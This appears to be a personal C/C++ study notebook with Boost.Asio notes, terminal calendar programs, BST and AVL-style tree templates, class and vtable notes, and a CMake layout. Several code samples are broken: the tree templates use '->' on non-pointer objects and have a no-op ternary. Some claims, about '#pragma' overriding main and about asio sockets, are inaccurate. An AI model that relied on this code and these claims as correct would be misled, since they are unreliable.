<p><code>main</code> function is the first one to be called, regardless of the order in which the functions are written. This can be overridden by <code>#pragma</code>, another preprocessor directive that works as instructions to the compiler. Some compilers only allow <code>main</code> to return an <code>int</code>.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="boost-asio"><a class="header" href="#boost-asio">boost asio</a></h1>
<p>Networking and low level input/output programming.</p>
<p>An async connector example:</p>
<pre><code class="language-cpp">using boost::asio;
// io_service provides IO functionality for asynchronous stuff
// like sockets, acceptors and stuff
io_service service;

//
ip::tcp::endpoint ep( ip::address::from_string("127.0.0.1"), 2001);
ip::tcp::socket sock(service);
sock.async_connect(ep, connect_handler);
service.run();
void connect_handler(const boost::system::error_code &amp; ec) {
// here we know we connected successfully
// if ec indicates success
}
</code></pre>
<h2 id="asioio_context"><a class="header" href="#asioio_context"><code>asio::io_context</code></a></h2>
<p>Boost.Asio defines <code>boost::asio::io_service</code>, a single class for an I/O service object. Every program based on Boost.Asio uses an object of type <code>boost::asio::io_service</code>. This can also be a global variable.</p>
<p>New versions of boost typdefs <code>io_context</code> to be <code>io_service</code>. <code>io_context</code> is the new thing it seems.</p>
<p>To prevent the <code>io_context</code> from running out of work, <a href="https://www.boost.org/doc/libs/1_78_0/doc/html/boost_asio/reference/io_service.html#boost_asio.reference.io_service.stopping_the_io_context_from_running_out_of_work">here</a>.</p>
<p><code>io_context::run()</code></p>
<p>The <code>run()</code> function blocks until all work has finished and there are no more handlers to be dispatched, or until the <code>io_context</code> has been stopped.</p>
<p>Returns the number of handlers that were executed.</p>
<p>If <code>run()</code> has nothing left to execute, it will return.</p>
<h2 id="asioipaddress"><a class="header" href="#asioipaddress"><code>asio::ip::address</code></a></h2>
<p>This class contains stuff to deal with IP addresses. It has interfaces to specifically deal with <a href="notes/./ipv4.html">IPv4</a> and <a href="notes/./ipv6.html">IPv6</a>
Most important functions:</p>
<ul>
<li><code>ip::address::from_string()</code>: Takes a string and returns an <code>ip::address</code> object.</li>
<li><code>ip::address::to_string()</code>: Takes an <code>ip::address</code> object and returns a string.</li>
<li><code>ip::address_v4::loopback()</code>: Returns the loopback address for IPv4. Similar is there for v6.</li>
<li><code>ip::address_v4::broadcast(addr, mask)</code>: Returns the broadcast address for the given address and mask.</li>
<li><code>ip::host_name()</code>: Returns the host name of the machine.</li>
</ul>
<h2 id="asioiptcp"><a class="header" href="#asioiptcp"><code>asio::ip::tcp</code></a></h2>
<p>This class is necessary for creation of TCP sockets.</p>
<h3 id="tcpacceptor"><a class="header" href="#tcpacceptor"><code>tcp::acceptor</code></a></h3>
<p>Accepts a new socket connection. So if say one socket was initially there and then another socket is needed to be utilized, the first socket can be gracefully closed and exited and the second one can be used peacefully.</p>
<p>Constructor:</p>
<p><code>acceptor::acceptor(const executor_type &amp;e)</code> constructs a new acceptor without opening it. There are other overloads as well.</p>
<p><code>acceptor::accept()</code>: Has two overloads</p>
<ul>
<li>One just accepts a new connection. That’s it, its argument is a <code>tcp::socket</code>.</li>
<li>Other overload takes a new connection and gives the detail of the other endpoint to the second argument of the type <code>tcp::endpoint</code>.</li>
</ul>
<p><code>acceptor::async_accept()</code>: Does the same as above but asynchronously.</p>
<p><code>acceptor::open(const protocol_type&amp; p)</code> &amp;&amp; <code>acceptor::bind(const endpoint&amp; e)</code></p>
<p>Using this we first define what kind of a connection we want (ipv4 vs ipv6), and then bind the acceptor to a local endpoint.</p>
<p>For example:</p>
<pre><code class="language-cpp">boost::asio::ip::tcp::acceptor acceptor(my_context);
boost::asio::ip::tcp::endpoint endpoint(boost::asio::ip::tcp::v4(), 12345);
acceptor.open(endpoint.protocol());
acceptor.bind(endpoint);
</code></pre>
<h2 id="tcpsocket"><a class="header" href="#tcpsocket"><code>tcp::socket</code></a></h2>
<p>A socket. It is an OS resource. Be careful while utilising it.</p>
<p>Constructor again takes an <code>io_context</code> to read and write.</p>
<p>Basically we don’t need sockets unless we are going <strong>really</strong> low level. Which isn’t really required.</p>
<p>An acceptor is basically an abstraction over the socket. It listens on an endpoint, and needs a new socket for each connection made to to the endpoint. It is the socket that then figures out the communication.</p>
<blockquote>
<p>NOTE: Sockets are not the networking sockets over here. This is because boost ppl had skill issues and actual sockets are actually represented as endpoints over here.</p>
</blockquote>
<h2 id="steady_timer"><a class="header" href="#steady_timer"><code>steady_timer</code></a></h2>
<p>Pretty much what you think it is. Acts as a timer, can be blocking (using the <code>wait()</code> method) or non-blocking (using the <code>async_wait()</code> method).</p>
<p>The <code>async_wait</code> method must take a completion handler (a function) whose sole parameter is of the type <code>const boost::system::error_code &amp;</code>.</p>
<p>If the async operations are cancelled using the <code>cancel()</code> method, the handler is invoked with <code>boost::asio::error::operation_aborted</code> as the argument.</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="c_codes"><a class="header" href="#c_codes">c_codes</a></h1>
<p>This is a 3 column calendar written in C.</p>
<pre><code class="language-c">//in the name of god

#include &lt;stdio.h&gt;

//defining the spacing of the individual cells and gap in between columns
#define col_gap_val 2
#define row_gap_val 2
#define tabsize 3

//defining the vertical separator of length 3 and blank of length 3

#define line printf("%*s",tabsize ,"---")
#define blank printf("%*s",tabsize ,"")

//newline 'cause I can't keep typing it

#define endl puts("")

void col_gap(){
    for (int j = 0; j &lt; col_gap_val; j++){
        blank;
    }
}

void row_gap(){
    for (int j = 0; j &lt; row_gap_val; j++){
        endl;
    }
}


int main(){

    //take the year as an input
    unsigned long long year;

    puts("Please enter an year:");
    scanf("%llu", &amp;year);

    //Array for names of days
    char *day[7] = {"Mo", "Tu", "We", "Th", "Fr", "Sa", "Su"};

    //Array for names of months
    char *month_name[12] = {"Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"};

    //Hold number of days in a month
    unsigned short days_in_month[12];

    //Often feel like just hardcoding it would have been easier
    for (int i = 1; i &lt; 13; i++){        
        switch(i){
            case 1:
            case 3:
            case 5:
            case 7:
            case 8:
            case 10:
            case 12: days_in_month[i-1] = 31; break;
            case 2: days_in_month[i-1] = (year%4 == 0 &amp;&amp; year%100 != 0)||(year%400 == 0)?29:28; break;
            case 4:
            case 6:
            case 9:
            case 11: days_in_month[i-1] = 30; break;
        }
        
    }

    //Remainder of each month to be used as an offset from Monday
    unsigned short month_offset[12];

    //Offset of Jan depends on the year taken
    month_offset[0] = ((((year-1)%400)/100)*5 + ((year-1)%100)*365 + ((year-1)%100)/4)%7;

    //Offset of other months depend on the previous months
    for (unsigned short i = 1; i &lt; 12; i++){
        month_offset[i] = (month_offset[i-1] + days_in_month[i-1])%7;
    }

    row_gap();
    for (int i = 0; i &lt; 10; i++){
        blank;
    } col_gap();
    printf("%0*llu", tabsize, year);
    row_gap(); 

    //Four iterations for four rows
    for (unsigned short row_iterator = 0; row_iterator &lt; 4; row_iterator++){

        //Month Headers
        printf("%*s%*s%*s", 4*tabsize, month_name[3*row_iterator], (7 + col_gap_val)*tabsize, month_name[3*row_iterator + 1], (7 + col_gap_val)*tabsize, month_name[3*row_iterator + 2]);

        row_gap();

        //Day Headers
        for (unsigned short month_iterator = 0; month_iterator &lt; 3; month_iterator++){
            for (unsigned short day_iterator = 0; day_iterator &lt; 7; day_iterator++){
                printf("%*s", tabsize, day[day_iterator]);
            }
            col_gap();
        }
    
        endl;

        //Divider under day header
        for (unsigned short month_iterator = 0; month_iterator &lt; 3; month_iterator++){
            for (unsigned short day_iterator = 0; day_iterator &lt; 7; day_iterator++){
                line;
            }
            col_gap();
        }
    
        endl;

        //to store the last printed number of each month in each line
        unsigned short flag[3] = {0};

        //First row(week) of each month in the calendar
        for (unsigned short month_iterator = 0; month_iterator &lt; 3; month_iterator++){
            //to leave blanks corresponding to the previous month / according to the Jan of that year
            for (unsigned short day_iterator = 0; day_iterator &lt; month_offset[3*row_iterator + month_iterator]; day_iterator++){
                blank;
            }
            //print the days till Sunday
            for (unsigned short day_iterator =  0; day_iterator + month_offset[3*row_iterator + month_iterator] &lt; 7; day_iterator++){
                printf("%*d", tabsize, day_iterator + 1);
                flag[month_iterator] = day_iterator + 1;
            }
            col_gap();
        }
    
        endl;

        //Print the next three weeks
        for (unsigned short week_iterator = 0; week_iterator &lt; 3; week_iterator++){
            for (unsigned short month_iterator = 0; month_iterator &lt; 3; month_iterator++){
                for (unsigned short day_iterator = 0; day_iterator &lt; 7; day_iterator++){
                    printf("%*d", tabsize, day_iterator + flag[month_iterator] + 1);
                }
                flag[month_iterator] += 7;
                col_gap();
            }
            endl;
        }

        //Stores if a sixth line is required for any month or not
        unsigned short sixlines[3] = {0};

        //Print the last/second-last row of each month
        for (int month_iterator = 0; month_iterator &lt; 3; month_iterator++){
            int day_iterator =  0;
            for (; day_iterator + flag[month_iterator] &lt; days_in_month[3*row_iterator + month_iterator]; day_iterator++){
                printf("%*d", tabsize, day_iterator + flag[month_iterator] + 1);
                //check if sixth line is reqd for any month
                if (day_iterator == 6) {
                    sixlines[month_iterator] = 1;
                    flag[month_iterator] += 7;
                    break;
                }
            }

            //printing necessary blanks if sixth line isnt required
            if (sixlines[month_iterator] == 0){
                for (int k = 0; k &lt;= 6 - day_iterator; k++){
                    blank;
                }
            }
            col_gap();
        }
        endl;

        for (int month_iterator = 0; month_iterator &lt; 3; month_iterator++){
            if (sixlines[month_iterator] != 0){
                for (int day_iterator = 0; day_iterator + flag[month_iterator] &lt; days_in_month[3*row_iterator + month_iterator]; day_iterator++){
                    printf("%*d", tabsize, day_iterator + flag[month_iterator] + 1);
                }
                for (int day_iterator = 0; (day_iterator + days_in_month[3*row_iterator + month_iterator])%7 != 0; day_iterator++){
                    blank;
                }
            } else {
                for (int day_iterator = 0; day_iterator &lt; 7; day_iterator++){
                    blank;
                }
            }
            col_gap();
        }
        
        row_gap();
    
    }    
}
</code></pre>
<p>This is a simpler (in code) 1 column version.</p>
<pre><code class="language-c">//in the name of god

#include &lt;stdio.h&gt;

//defining the spacing of the individual cells

#define tabsize 4

//defining the vertical separator of length 4 and blank of length 4

#define line printf("%*s",tabsize ,"----")
#define blank printf("%*s",tabsize ,"")

//newline 'cause I can't keep typing it

#define endl printf("\n")

int main(){

    //the year to be taken as input
    
    int year;
    
    //prompt to enter the year
    
    printf("\nPlease enter the required year: ");
    
    //take the current year as input
    
    scanf("%d", &amp;year);
    
    //setting offset for January of the year; every 400 years the calendar repeats; every 100 years an offset of 5 days is added; the rest is calculated manually
    
    int start = ((((year-1)%400)/100)*5 + ((year-1)%100)*365 + ((year-1)%100)/4)%7;

    //The below comment was a test to check the offset for each year. Fuck the julian calendar.

    // //printf("%d",start%7);
    
    //blank space for neatness
    
    endl; endl;

    //initialize an array to hold days of the month
    
    int month[12];

    //Array to hold the days
    
    char* day[7] = {"Mon","Tue","Wed","Thu","Fri","Sat","Sun"};
    char* month_name[12] = {"Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"};

    //Initialising the no. of days in a month; if it is a year divisible by 400 or it is divisible by 4 but not by 100, then feb has 29 days
    
    for (int i = 1; i &lt; 13; i++){
    
        switch(i){
            case 1:
            case 3:
            case 5:
            case 7:
            case 8:
            case 10:
            case 12: month[i-1] = 31; break;
            case 2: month[i-1] = (year%4 == 0 &amp;&amp; year%100 != 0)||(year%400 == 0)?29:28; break;
            case 4:
            case 6:
            case 9:
            case 11: month[i-1] = 30; break;
        }
        
    }
    //print the month name

    printf("%*s", 16, month_name[0]);

    endl; endl;
    
    //print the first line of days

    for (int l = 0; l &lt; 7; l++){
       printf("%*s", tabsize, day[l]);
    }

    endl;

    //print a vertical continuous vertical line below it. Note that the continuity is created 
    //by the terminal and font glyphs. Not all terminals support this.
    
    for (int i = 0; i &lt; 7; i++){
            line;
    }
    
    endl;

    //At the very beginning this was an array, later I realised that this wasn't required 
    //and that the offset can be calculated within the loop printing the numbers
    
    // //int rem = start;

    //Print offset for jan
    
    for (int k = 0; k &lt; start%7; k++){
        blank;        
    }

    // start the loop for all the months
    
    for (int i = 0; i &lt; 12; i++){

        //start loop for days in each month
        
        for (int j = 1; j &lt;= month[i]; j++){
            printf("%*d", tabsize, j);

            
            
            if((j+start)%7 == 0){
                
                endl;
            }
        }

        //set the offset for the next month right now
        
        start =  (start + month[i])%7;

        //neatness
        
        endl; endl;

        //only do all this if the month is not dec; otherwise there would be stray spaces and an extra header of days at the very last.
        
        if (i &lt; 11){
            printf("%*s", 16, month_name[i+1]);

            endl; endl;
            
            for (int k = 0; k &lt; 7; k++){
                printf("%*s", tabsize, day[k]);
            }

            endl;

        for (int l = 0; l &lt; 7; l++){
            line;
        }
        
            endl;
            
        }

        for (int m = 0; m &lt; start; m++){
            blank;
        }            

    }
    
    endl;

}

</code></pre>
<p>Binary Search Tree template</p>
<pre><code class="language-cpp">#include &lt;bits/stdc++.h&gt;

template &lt;typename key_, typename value_&gt; struct Data {
    key_ key;
    value_ value;
    Data(key_ key__, value_ value__) : key(key__), value(value__) {}
    bool operator&gt;(Data&lt;key_, value_&gt; D) { return key &gt; D-&gt;key; }
    bool operator&lt;(Data&lt;key_, value_&gt; D) { return key &lt; D-&gt;key; }
    bool operator&gt;=(Data&lt;key_, value_&gt; D) { return key &gt;= D-&gt;key; }
    bool operator&lt;=(Data&lt;key_, value_&gt; D) { return key &lt;= D-&gt;key; }
    bool operator==(Data&lt;key_, value_&gt; D) { return key == D-&gt;key; }
    bool operator!=(Data&lt;key_, value_&gt; D) { return key != D-&gt;key; }
};

template &lt;typename key_, typename value_&gt; class BSTNode {
    Data&lt;key_, value_&gt; dat;
    BSTNode *parent;
    BSTNode *left;
    BSTNode *right;
    BSTNode(key_ key__, value_ value__)
        : dat(Data&lt;key_, value_&gt;(key__, value__)) {
        parent = nullptr;
        left = nullptr;
        right = nullptr;
    };
    BSTNode(Data&lt;key_, value_&gt; dat_) : dat(dat_) {
        parent = nullptr;
        left = nullptr;
        right = nullptr;
    };
    template &lt;typename&gt; friend class BST;
};

template &lt;typename key_, typename value_&gt; class BST {
  private:
    typedef BSTNode&lt;key_, value_&gt; data_;
    data_ *root;
    void remove_(key_ key, data_ *&amp;ptr) {
        if (ptr == nullptr) {
            return;
        } else if (ptr-&gt;dat.key &gt; key) {
            remove_(key, ptr-&gt;left);
        } else if (ptr-&gt;dat.key &lt; key) {
            remove_(key, ptr-&gt;right);
        } else if (ptr-&gt;right != nullptr &amp;&amp; ptr-&gt;left != nullptr) {
            data_ *min = min_(ptr-&gt;right);
            ptr-&gt;dat = min-&gt;dat;
            remove_(ptr-&gt;dat.key, ptr-&gt;right);
        } else {
            data_ *oldNode = ptr;
            ptr-&gt;left != nullptr ? ptr = ptr-&gt;left : ptr-&gt;right;
            if (ptr != nullptr) {
                ptr-&gt;parent = ptr-&gt;parent-&gt;parent;
            }
            delete oldNode;
        }
    }
    data_ *max_(data_ *ptr) {
        if (ptr == nullptr) {
            return nullptr;
        }
        while (ptr-&gt;right != nullptr) {
            ptr = ptr-&gt;right;
        }
        return ptr;
    }
    data_ *min_(data_ *ptr) {
        if (ptr == nullptr) {
            return nullptr;
        }
        while (ptr-&gt;left != nullptr) {
            ptr = ptr-&gt;left;
        }
        return ptr;
    }

  public:
    BST() { root = nullptr; }
    void insert(key_ key, value_ value) {
        if (root == nullptr) {
            root = new data_(key, value);
            return;
        }
        data_ *node = root;
        data_ *ins = new data_(key, value);
        while (node != nullptr) {
            if (node-&gt;dat &gt; ins-&gt;dat &amp;&amp; node-&gt;left == nullptr) {
                node-&gt;left = ins;
                ins-&gt;parent = node;
                return;
            } else if (node-&gt;dat &lt; ins-&gt;dat &amp;&amp; node-&gt;right == nullptr) {
                node-&gt;right = ins;
                ins-&gt;parent = node;
                return;
            } else if (node-&gt;dat &gt; ins-&gt;dat) {
                node = node-&gt;left;
            } else if (node-&gt;dat &lt; ins-&gt;dat) {
                node = node-&gt;right;
            } else {
                return;
            }
        }
    }
    void insert(Data&lt;key_, value_&gt; dat) {
        if (root == nullptr) {
            root = new data_(dat);
            return;
        }
        data_ *node = root;
        data_ *ins = new data_(dat);
        while (node != nullptr) {
            if (node-&gt;dat &gt; ins-&gt;dat &amp;&amp; node-&gt;left == nullptr) {
                node-&gt;left = ins;
                ins-&gt;parent = node;
                return;
            } else if (node-&gt;dat &lt; ins-&gt;dat &amp;&amp; node-&gt;right == nullptr) {
                node-&gt;right = ins;
                ins-&gt;parent = node;
                return;
            } else if (node-&gt;dat &gt; ins-&gt;dat) {
                node = node-&gt;left;
            } else if (node-&gt;dat &lt; ins-&gt;dat) {
                node = node-&gt;right;
            } else {
                return;
            }
        }
    }
    data_ *search(key_ key) {
        data_ *search_ = root;
        while (search_ != nullptr) {
            if (search_-&gt;dat.key &gt; key) {
                search_ = search_-&gt;left;
            } else if (search_-&gt;dat.key &lt; key) {
                search_ = search_-&gt;right;
            } else if (search_-&gt;dat.key == key) {
                return search_;
            }
        }
        return nullptr;
    }
    void remove(key_ key) { remove_(key, root); }
    data_ *max() { return max_(root); }
    data_ *min() { return min_(root); }
    data_ *closest(data_ num) {
        data_ *search_ = root;
        while (search_ != nullptr) {
            if (search_ == num) {
                return search_;
            } else if (search_ &gt; num) {
                if (search_-&gt;left != nullptr) {
                    search_ = search_-&gt;left;
                } else if (search_-&gt;parent == nullptr) {
                    return search_;
                } else {
                    return (abs(search_-&gt;key - num-&gt;key) &gt;
                                    abs(search_-&gt;parent-&gt;key - num-&gt;key)
                                ? search_-&gt;parent
                                : search_);
                }
            } else {
                if (search_-&gt;right != nullptr) {
                    search_ = search_-&gt;right;
                } else if (search_-&gt;parent == nullptr) {
                    return search_;
                } else {
                    return (abs(search_-&gt;key - num-&gt;key) &gt;
                                    abs(search_-&gt;parent-&gt;key - num-&gt;key)
                                ? search_-&gt;parent
                                : search_);
                }
            }
        }
    }
};

int main(int argc, char *argv[]) {
    BST&lt;int, int&gt; B;
    return 0;
}
</code></pre>
<p>Balanced Binary Search Tree template</p>
<pre><code class="language-cpp">#include &lt;bits/stdc++.h&gt;
#include &lt;cstdint&gt;

template &lt;typename key_, typename value_&gt; struct Data {
    key_ key;
    value_ value;
    Data(key_ key__, value_ value__) : key(key__), value(value__) {}
    bool operator&gt;(Data&lt;key_, value_&gt; D) { return key &gt; D-&gt;key; }
    bool operator&lt;(Data&lt;key_, value_&gt; D) { return key &lt; D-&gt;key; }
    bool operator&gt;=(Data&lt;key_, value_&gt; D) { return key &gt;= D-&gt;key; }
    bool operator&lt;=(Data&lt;key_, value_&gt; D) { return key &lt;= D-&gt;key; }
    bool operator==(Data&lt;key_, value_&gt; D) { return key == D-&gt;key; }
    bool operator!=(Data&lt;key_, value_&gt; D) { return key != D-&gt;key; }
};

template &lt;typename key_, typename value_&gt; class BSTNode {
    Data&lt;key_, value_&gt; dat;
    BSTNode *parent;
    BSTNode *left;
    BSTNode *right;
    int64_t height;
    BSTNode(key_ key__, value_ value__)
        : dat(Data&lt;key_, value_&gt;(key__, value__)) {
        parent = nullptr;
        left = nullptr;
        right = nullptr;
        height = 0;
    };
    BSTNode(Data&lt;key_, value_&gt; dat_) : dat(dat_) {
        parent = nullptr;
        left = nullptr;
        right = nullptr;
        height = 0;
    };
    template &lt;typename&gt; friend class BST;
};

template &lt;typename key_, typename value_&gt; class BST {
  private:
    typedef BSTNode&lt;key_, value_&gt; data_;
    data_ *root;
    void remove_(key_ key, data_ *&amp;ptr) {
        if (ptr == nullptr) {
            return;
        } else if (ptr-&gt;dat.key &gt; key) {
            remove_(key, ptr-&gt;left);
        } else if (ptr-&gt;dat.key &lt; key) {
            remove_(key, ptr-&gt;right);
        } else if (ptr-&gt;right != nullptr &amp;&amp; ptr-&gt;left != nullptr) {
            data_ *min = min_(ptr-&gt;right);
            ptr-&gt;dat = min-&gt;dat;
            remove_(ptr-&gt;dat.key, ptr-&gt;right);
        } else {
            data_ *oldNode = ptr;
            ptr-&gt;left != nullptr ? ptr = ptr-&gt;left : ptr-&gt;right;
            if (ptr != nullptr) {
                ptr-&gt;parent = ptr-&gt;parent-&gt;parent;
            }
            delete oldNode;
        }
        balance(ptr);
    }
    data_ *max_(data_ *ptr) {
        if (ptr == nullptr) {
            return nullptr;
        }
        while (ptr-&gt;right != nullptr) {
            ptr = ptr-&gt;right;
        }
        return ptr;
    }
    data_ *min_(data_ *ptr) {
        if (ptr == nullptr) {
            return nullptr;
        }
        while (ptr-&gt;left != nullptr) {
            ptr = ptr-&gt;left;
        }
        return ptr;
    }
    void right_rot(data_ *&amp;ptr) {
        data_ *right_child = ptr-&gt;right;
        ptr-&gt;right = right_child-&gt;left;
        right_child-&gt;left = ptr;
        right_child-&gt;parent = ptr-&gt;parent;
        ptr-&gt;parent = right_child;
        ptr-&gt;height = max(height(ptr-&gt;left), height(ptr-&gt;right)) + 1;
        right_child-&gt;height = max(height(right_child-&gt;right), ptr-&gt;height) + 1;
        ptr = right_child;
    }
    void left_rot(data_ *&amp;ptr) {
        data_ *left_child = ptr-&gt;left;
        ptr-&gt;left = left_child-&gt;right;
        left_child-&gt;right = ptr;
        left_child-&gt;parent = ptr-&gt;parent;
        ptr-&gt;parent = left_child;
        ptr-&gt;height = max(height(ptr-&gt;left), height(ptr-&gt;right)) + 1;
        left_child-&gt;height = max(height(left_child-&gt;left), ptr-&gt;height) + 1;
        ptr = left_child;
    }
    int64_t height(data_ *ptr) const {
        return ptr == nullptr ? -1 : ptr-&gt;height;
    }
    void balance(data_ *&amp;ptr) {
        if (ptr == nullptr) {
            return;
        }

        if (height(ptr-&gt;left) - height(ptr-&gt;right) &gt; 1) {
            if (height(ptr-&gt;left-&gt;left) &gt;= height(ptr-&gt;left-&gt;right)) {
                left_rot(ptr);
            } else {
                right_rot(ptr-&gt;left);
                left_rot(ptr);
            }
        } else if (height(ptr-&gt;right) - height(ptr-&gt;left) &gt; 1) {
            if (height(ptr-&gt;right-&gt;right) &gt;= height(ptr-&gt;right-&gt;left)) {
                right_rot(ptr);
            } else {
                left_rot(ptr-&gt;right);
                right_rot(ptr);
            }
        }
    }

  public:
    BST() { root = nullptr; }
    void insert(key_ key, value_ value) {
        if (root == nullptr) {
            root = new data_(key, value);
            return;
        }
        data_ *node = root;
        data_ *ins = new data_(key, value);
        while (node != nullptr) {
            if (node-&gt;dat &gt; ins-&gt;dat &amp;&amp; node-&gt;left == nullptr) {
                node-&gt;left = ins;
                ins-&gt;parent = node;
                return;
            } else if (node-&gt;dat &lt; ins-&gt;dat &amp;&amp; node-&gt;right == nullptr) {
                node-&gt;right = ins;
                ins-&gt;parent = node;
                return;
            } else if (node-&gt;dat &gt; ins-&gt;dat) {
                node = node-&gt;left;
            } else if (node-&gt;dat &lt; ins-&gt;dat) {
                node = node-&gt;right;
            } else {
                return;
            }
        }
        balance(node);
    }
    void insert(Data&lt;key_, value_&gt; dat) {
        if (root == nullptr) {
            root = new data_(dat);
            return;
        }
        data_ *node = root;
        data_ *ins = new data_(dat);
        while (node != nullptr) {
            if (node-&gt;dat &gt; ins-&gt;dat &amp;&amp; node-&gt;left == nullptr) {
                node-&gt;left = ins;
                ins-&gt;parent = node;
                return;
            } else if (node-&gt;dat &lt; ins-&gt;dat &amp;&amp; node-&gt;right == nullptr) {
                node-&gt;right = ins;
                ins-&gt;parent = node;
                return;
            } else if (node-&gt;dat &gt; ins-&gt;dat) {
                node = node-&gt;left;
            } else if (node-&gt;dat &lt; ins-&gt;dat) {
                node = node-&gt;right;
            } else {
                return;
            }
        }
        balance(node);
    }
    data_ *search(key_ key) {
        data_ *search_ = root;
        while (search_ != nullptr) {
            if (search_-&gt;dat.key &gt; key) {
                search_ = search_-&gt;left;
            } else if (search_-&gt;dat.key &lt; key) {
                search_ = search_-&gt;right;
            } else if (search_-&gt;dat.key == key) {
                return search_;
            }
        }
        return nullptr;
    }
    void remove(key_ key) { remove_(key, root); }
    data_ *max() { return max_(root); }
    data_ *min() { return min_(root); }
};

int main(int argc, char *argv[]) {
    BST&lt;int, int&gt; B;
    return 0;
}
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><h1 id="classes"><a class="header" href="#classes">classes</a></h1>
<p>Classes are nothing but a collection of variables and member functions that are also called methods.</p>
<p>Memory-wise the layout is the same as that of a C struct. Only the variables are stored in the class unless it has virtual member functions or inheritance.</p>
<blockquote>
<p>NOTE:
Memory wise functions are still stored in the code section of the binary. They also take an implicit argument to <code>this</code>, the current pointer to the object, unless made <code>static</code>.</p>
</blockquote>
<h2 id="access-specifiers"><a class="header" href="#access-specifiers">Access specifiers</a></h2>
<p>A class has access specifiers such as public, private and protected.</p>
<ul>
<li>
<p><code>public</code>: accessible by anyone.</p>
</li>
<li>
<p><code>private</code>: accessible only by the member functions of the class.</p>
</li>
<li>
<p><code>protected</code>: accessible by classes inheriting it and current class.</p>
</li>
</ul>
<h2 id="inheritance"><a class="header" href="#inheritance">Inheritance</a></h2>
<p>When you inherit from a class, you get all the properties of that class. There are three types of inheritances:</p>
<ul>
<li>
<p><code>public</code>: All the public stuff in base class is public in derived class, and all the protected stuff is still protected.</p>
</li>
<li>
<p><code>protected</code>: All the public and protected stuff become protected.</p>
</li>
<li>
<p><code>private</code>: All the public and protected stuff become private.</p>
</li>
</ul>
<blockquote>
<p>NOTE:
Memory of the base class variables still exist there. You just can’t access them without haxx. The compiler cries if you try to access them like a sane human being.</p>
</blockquote>
<h3 id="virtual-functions"><a class="header" href="#virtual-functions">Virtual functions</a></h3>
<p>If you have a base pointer to the derived class, and you call a method that is common to both the base class and the derived class, you will be calling the function of the base class and not the derived class.
This is because at compile time, the compiler sees the type of the pointer as base and thinks that the object must also be base class type.</p>
<p>To resolve such issues, we use the <code>virtual</code> keyword for a method. This makes the function dispatch runtime, also known as <em>late method binding</em>.</p>
<p>Once a base class function is marked virtual, all the derived classes, no matter how deep the inheritance is, are also virtual implicitly.</p>
<h4 id="how-it-works"><a class="header" href="#how-it-works">How it works</a></h4>
<p>The compiler adds a pointer to each object that points to the vtable of functions. The table is called <strong>virtual table</strong>, and the pointer is called <strong>virtual pointer</strong>. During runtime the binary reads the virtual pointer, goes to the virtual table, and checks the function to be executed.</p>
<blockquote>
<p>Rust has something equivalent for traits called <code>dyn</code>.</p>
</blockquote>
<div style="break-before: page; page-break-before: always;"></div><h1 id="cmake"><a class="header" href="#cmake">cmake</a></h1>
<ul>
<li>Hard link the cmake_commands.json file generated after running <code>cmake -DCMAKE_EXPORT_COMPILE_COMMANDS=1 ..</code> in the build directory.</li>
</ul>
<p>Set up the dir tree as follows:</p>
<pre><code>___ root
 |
 |--- build # artifacts go here
 |--- src # source files, including main go here
 |--- include # header files go here
 |--- libs # library dependencies go here
 |--- .git # no shit
 .gitgnore # add build to this
</code></pre>
<p><code>CMakeLists.txt</code> at root:</p>
<pre><code class="language-cmake">cmake_minimum_required(VERSION 3.27)

project(tic_tac_toe
    VERSION 0.1
    DESCRIPTION "Learning CMake and FXTUI together"
    LANGUAGES CXX
)
# CMAKE Standard
set (CMAKE_CXX_STANDARD 17)
# Adding global flags
set(CMAKE_CXX_FLAGS "${CMAKE_CXX_FLAGS} -Wall -Wextra -Wpedantic")
include(FetchContent)

FetchContent_Declare(ftxui
  GIT_REPOSITORY https://github.com/ArthurSonzogni/ftxui
  GIT_TAG v5.0.0
)

FetchContent_GetProperties(ftxui)
if(NOT ftxui_POPULATED)
  FetchContent_Populate(ftxui)
  add_subdirectory(${ftxui_SOURCE_DIR} ${ftxui_BINARY_DIR} EXCLUDE_FROM_ALL)
endif()
# including the header files
include_directories(include)
# including the source files
add_subdirectory(src)
</code></pre>
<p><code>CMakeLists.txt</code> at src:</p>
<pre><code class="language-cmake">set (TARGET ${PROJECT_NAME})
file(GLOB SRC_LIST CONFIGURE_DEPENDS "${CMAKE_SOURCE_DIR}/src/*.cpp")
add_executable(${TARGET} ${SRC_LIST})
target_link_libraries(${TARGET}
  PRIVATE ftxui::screen
  PRIVATE ftxui::dom
  PRIVATE ftxui::component
)
</code></pre>
<p><code>CMakeLists.txt</code> at libs:</p>
<pre><code class="language-cmake"># Note that headers are optional, and do not affect add_library, but they will not

file(GLOB LIB_HEADER_LIST CONFIGURE_DEPENDS "${ModernCMakeExample_SOURCE_DIR}/libs/*.cpp")
file(GLOB LIB_SRC_LIST CONFIGURE_DEPENDS "${ModernCMakeExample_SOURCE_DIR}/libs/src/*.cpp")

# Make an automatic library - will be static or dynamic based on user setting
add_library(modern_library ${LIB_SRC_LIST} ${LIB_HEADER_LIST})

# We need this directory, and users of our library will need it too
target_include_directories(modern_library PUBLIC ../libs)

# This depends on (header only) boost
target_link_libraries(modern_library PRIVATE Boost::boost)

# All users of this library will need at least C++17
target_compile_features(modern_library PUBLIC cxx_std_17)
</code></pre>
<p><code>.gitignore</code> contains <code>/build*</code> and <code>.cache</code></p>
<blockquote>
<p>Might have to add libs separately later on. Not sure how to do that.</p>
</blockquote>
<h2 id="links"><a class="header" href="#links">Links</a></h2>
<ul>
<li>https://stackoverflow.com/questions/76214615/how-can-i-make-the-vs-code-clangd-extension-aware-of-the-include-paths-defined-i</li>
<li>https://gitlab.com/CLIUtils/modern-cmake/-/blob/master/examples/extended-project/src/CMakeLists.txt</li>
<li>https://stackoverflow.com/questions/42533166/how-to-separate-header-file-and-source-file-in-cmake#</li>
<li></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h1 id="c_notes"><a class="header" href="#c_notes">C_notes</a></h1>
<p>Must read: <a href="https://beej.us/guide/bgc/html/index-wide.html">Brian Jorgensen Hall’s blog</a></p>
<div class="epigraph"><blockquote><p> C is not a big language, and it is not well served by a big book.</p><footer>
Brian W. Kernighan, Dennis M. Ritchie</footer></blockquote></div>
<pre><code class="language-c">/* Hello World Program */
#include &lt;stdio.h&gt;

int main(void) { printf("Hello World!\n"); }
</code></pre>
